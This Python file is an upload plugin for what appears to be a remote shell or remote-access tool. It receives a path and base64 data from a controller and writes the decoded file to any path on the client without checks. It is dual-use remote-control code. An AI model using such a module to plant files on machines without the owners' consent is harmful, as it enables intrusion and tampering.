import shlex
from os.path import expanduser
from base64 import b64decode


class Plugin(object):
    """
    Handles the uploading of files to the client.
    """
    version = 'v1.0'
    invocation = 'upload '
    enabled = True

    def __init__(self):
        self.filepath = None

    def write_file_data(self, upload_data, upload_filepath):
        """
        Write the upload_data to the upload_filename

        :param upload_data:
        :param upload_filepath:
        :return:
        """

        with open(expanduser(upload_filepath), 'wb') as f:
            f.write(b64decode(upload_data))
        print('<', upload_filepath, 'written...', '>')
        return

    def handle_file_upload(self, client, upload_data, upload_filename):
        """
        Handle the file upload.

        :param client:
        :param upload_data:
        :param upload_filename:
        :return:
        """

        try:
            self.write_file_data(upload_data, upload_filename)
            client.send_data('Got file.')
        except FileNotFoundError as err_msg:
            client.send_data('Could not find the directory to write to: {}'.format(err_msg))

        return self

    def run(self, client, data):
        args = shlex.split(data)

        if not args:
            client.send_data('Must include a local and remote filepath.')
            return

        if args[0] == 'filepath':
            print('< Got filepath, "{}" for upload... >'.format(args[1]))
            self.filepath = args[1]
            client.send_data('Got filepath.')

            if self.filepath is not None:
                print('< Receiving upload data... >')
                upload_data = client.receive_data()
                self.handle_file_upload(client, upload_data, self.filepath)
                print('< Upload complete! >')
                self.filepath = None
            return

        if self.filepath is None:
            client.send_data('Requires an upload filename.  Send with `upload filename {filename}`.')
            return

        return
